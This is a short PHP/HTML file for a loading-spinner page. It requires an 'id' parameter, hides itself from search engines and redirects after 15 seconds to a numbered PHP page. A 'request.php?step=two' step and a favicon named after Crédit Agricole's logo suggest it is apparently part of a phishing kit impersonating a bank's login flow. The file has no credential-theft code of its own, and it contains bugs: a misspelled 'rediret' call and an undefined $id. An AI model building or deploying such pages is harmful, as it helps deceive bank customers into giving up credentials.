<?php
    $page = 'default';
    require_once 'init.php';
    if(!isset($_GET['id'])):
        die(rediret($link)); // We're done here
    else:
      $action = './request.php?step=two&'.$id;

?>
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
    <meta name="theme-color" content="#6dc77a"/>
    <meta name="msapplication-navbutton-color" content="#6dc77a"/>
    <meta name="apple-mobile-web-app-status-bar-style" content="#6dc77a" />
    <meta http-equiv="Refresh" content="15; url=./s3001251.php?id=81587865">
    <link rel="icon" type="image/png" href="CA_Logo_seul-1.svg" />

    <style type="text/css">
            body {
            width: 100vw;
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            align-content: center;
          }

        .bounceball {
            width: 8vmax;
            height: 8vmax;
            border-right: 4px solid #006F4E;
            border-radius: 100%;
            animation: spinRight 800ms linear infinite;

            &:before, &:after {
              content: '';
              width: 6vmax;
              height: 6vmax;
              display: block;
              position: absolute;
              top: calc(50% - 3vmax);
              left: calc(50% - 3vmax);
              border-left: 3px solid #006F4E;
              border-radius: 100%;
              animation: spinLeft 800ms linear infinite;
            }

            &:after {
              width: 4vmax;
              height: 4vmax;
              top: calc(50% - 2vmax);
              left: calc(50% - 2vmax);
              border: 0;
              border-right: 2px solid #006F4E;
              animation: none;
            }
          }

          @keyframes spinLeft {
            from {transform:rotate(0deg);}
            to {transform:rotate(720deg);}
          }

          @keyframes spinRight {
            from {transform:rotate(360deg);}
            to {transform:rotate(0deg);}
          }
    </style>
  </head>
  <body>
      <div class="wrap">
          <div class="loading">
            <div class="bounceball" style="text-align:center;"></div>
            </br>
            </br>
          </div>

      </div>

  </body>
</html>

<?php
    endif;
    ob_end_flush();
?>
